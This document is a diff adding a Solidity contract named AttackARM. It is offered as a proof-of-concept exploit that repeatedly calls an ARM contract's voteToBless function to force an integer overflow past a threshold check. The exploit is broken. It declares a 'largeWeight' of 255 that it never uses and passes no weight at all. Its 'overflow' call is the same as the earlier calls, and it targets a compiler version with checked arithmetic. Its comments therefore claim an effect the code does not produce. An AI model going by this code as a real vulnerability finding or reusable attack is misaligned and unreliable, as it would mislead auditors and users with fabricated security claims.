@@ -1,0 +1,35 @@
+pragma solidity 0.8.19;
+
+contract AttackARM {
+    // Reference to the vulnerable ARM contract
+    ARM private armContract;
+
+    constructor(address _armContractAddress) {
+        armContract = ARM(_armContractAddress);
+    }
+
+    function attack() external {
+        // Call voteToBless multiple times to accumulate a large accumulated weight
+        for (uint256 i = 0; i < 10; i++) {
+            IARM.TaggedRoot[] memory taggedRoots = new IARM.TaggedRoot[](1);
+            taggedRoots[0] = IARM.TaggedRoot({
+                commitStore: address(0),
+                root: bytes32(0)
+            });
+
+            // Use a large weight to accumulate a large accumulated weight
+            armContract.voteToBless(taggedRoots);
+        }
+
+        // Set a large weight that causes an overflow
+        // This will bypass the intended threshold check
+        uint8 largeWeight = 255;
+        IARM.TaggedRoot[] memory taggedRootsOverflow = new IARM.TaggedRoot[](1);
+        taggedRootsOverflow[0] = IARM.TaggedRoot({
+            commitStore: address(0),
+            root: bytes32(0)
+        });
+
+        armContract.voteToBless(taggedRootsOverflow);  // Integer overflow here
+    }
+}
